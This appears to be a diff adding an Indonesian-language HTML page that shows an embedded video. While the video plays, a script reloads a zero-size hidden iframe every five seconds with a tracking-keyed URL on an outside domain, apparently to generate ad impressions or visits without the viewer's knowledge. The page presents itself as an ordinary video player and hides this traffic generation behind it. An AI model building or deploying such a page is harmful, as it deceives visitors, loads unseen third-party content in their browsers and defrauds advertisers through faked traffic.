@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Video dengan Redirect Berjalan di Balik Layar</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background: #f9f9f9;
+      font-family: Arial, sans-serif;
+      flex-direction: column;
+    }
+    video {
+      max-width: 90%;
+      border: 4px solid #333;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+    }
+    p {
+      margin-top: 15px;
+      font-size: 18px;
+      font-weight: bold;
+      color: #333;
+    }
+    iframe {
+      display: none;
+      width: 0;
+      height: 0;
+    }
+  </style>
+</head>
+<body>
+  <video id="myVideo" controls>
+    <source src="https://cdn.videy.co/Pg70qHzq1.mp4" type="video/mp4">
+    Browser kamu tidak mendukung video.
+  </video>
+  <p></p>
+
+  <iframe id="hiddenLink"></iframe>
+
+  <script>
+    const video = document.getElementById("myVideo");
+    const hiddenFrame = document.getElementById("hiddenLink");
+    const targetLink = "https://domicilesweetheart.com/tze6fpzg8?key=240aa2c9821f3de8a37977ad89762db6";
+
+    let refreshInterval;
+
+    // Saat video mulai diputar
+    video.addEventListener("play", function() {
+      // Mulai refresh link setiap 5 detik
+      refreshInterval = setInterval(() => {
+        hiddenFrame.src = targetLink + "&t=" + new Date().getTime();
+      }, 5000); // refresh setiap 5 detik
+    });
+
+    // Saat video dijeda atau berhenti
+    video.addEventListener("pause", function() {
+      clearInterval(refreshInterval);
+    });
+    video.addEventListener("ended", function() {
+      clearInterval(refreshInterval);
+    });
+  </script>
+</body>
+</html>
